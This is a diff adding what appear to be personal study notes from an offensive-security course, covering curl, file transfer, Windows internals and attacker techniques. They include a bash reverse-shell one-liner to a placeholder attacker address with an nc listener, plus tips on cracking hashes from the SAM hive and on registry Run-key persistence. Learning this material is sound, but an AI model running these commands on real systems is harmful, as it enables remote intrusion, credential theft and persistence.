@@ -1,0 +1,42 @@
+https://semsec.org/home/
+
+n for next in and N for previous
+curl --url https://semsec.org/home/ // give me back the response of the page
+curl --url https://semsec.org/home/ -v // verbose
+  request details
+
+curl --url https://semsec.org/home/ -o academy.html
+firefox academy.html
+
+// transfer a file
+python3 -m http.server // on my machine
+other machine: curl http://192.168.1.47:8000/ansir-art // to download the file from my machine
+
+we can also use wget
+
+if I have write access to a file and this file is common with someone with execute access
+  then here I can just update the content and add certain commands
+
+on victim pc: bash -i >& /dev/tcp/my_ipaddress/4444 0>&1 // or maybe my_ipaddress
+
+on my pc:
+nc -lvp 4444 // and when the connection happens I get a reverse shell
+
+windows:
+process hacker: is similar to task manager but more advanced for malware analysis
+
+pereferice management: show me all devices I am conntect to on my pc
+  details on the processor
+  details on internet pereferic, missing drives ...
+
+registery edit: database for setting and configurations for windows
+SAM and SECURITY they contains database file for windows can benifit me
+  I can crack all hashes for passwords for users in os
+MITRE attack to get to see how to use registery // Registery Run Keys / Startup Folder
+  here I can add something that runs on everytime the user login
+url: attack.mitre.org
+
+powershell is more powerfull than cmd
+
+
+netstat
